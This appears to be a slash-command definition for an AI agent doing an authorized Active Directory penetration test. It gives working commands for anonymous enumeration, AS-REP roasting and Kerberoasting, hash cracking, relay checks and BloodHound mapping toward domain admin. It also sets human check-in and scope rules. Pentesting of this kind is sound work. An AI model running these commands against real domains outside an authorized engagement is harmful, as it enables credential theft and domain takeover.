---
description: Authorized Active Directory pentest - enumeration, AS-REP/Kerberoast, relay checks, BloodHound path. Usage: ad-hunt <domain> <dc-ip> [--users users.txt] [--creds user:pass]
---

# /ad-hunt

Authorized internal AD engagement only. Never against external bug bounty targets.

## Run This

```bash
# Discovery:
python tools/port_scanner.py <dc-ip> --ports 53,88,135,139,389,445,636,3268,3389,5985

# No-creds enumeration:
nxc smb <dc-ip> -u '' -p '' --shares        # null session
nxc ldap <dc-ip> -u '' -p ''                 # anonymous LDAP -> domain/base DN
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>

# AS-REP roast (no creds, needs usernames):
nxc ldap <dc-ip> -u users.txt -p '' --asreproast
# Kerberoast (needs creds):
nxc ldap <dc-ip> -u user -p pass --kerberoasting
# Relay precheck (SMB signing disabled?):
nxc smb <dc-ip> -u user -p pass --check

# Paths (after creds):
bloodhound-python -u user -p pass -d <domain> -ns <dc-ip> -c All
```

## Workflow

1. Port scan → identify DC/AD services.
2. Null session / anonymous LDAP → domain info + users (High if unauth enum works).
3. AS-REP roast → crack (hashcat -m 18200) → valid account.
4. Kerberoast SPNs → crack (hashcat -m 13100) → service account → DA path.
5. BloodHound → find DA path (GenericAll/WriteDACL/RBCD/delegation).
6. Stop at human go/no-go before any lateral movement/impersonation.

## Rules (HARD)

- AUTHORIZED ENGAGEMENT ONLY. Confirm scope in writing.
- No LLMNR poisoning, no spraying, no relay, no DCSync without explicit human approval.
- Every phase = check in with the human before the next.
- Never lock out accounts (limit spray attempts, monitor lockout policy).

## Output

`findings/<domain>/ad-<date>.md`: found users, SPNs, roast hashes (cracked passwords REDACTED - report only the path), BloodHound edges, severity.
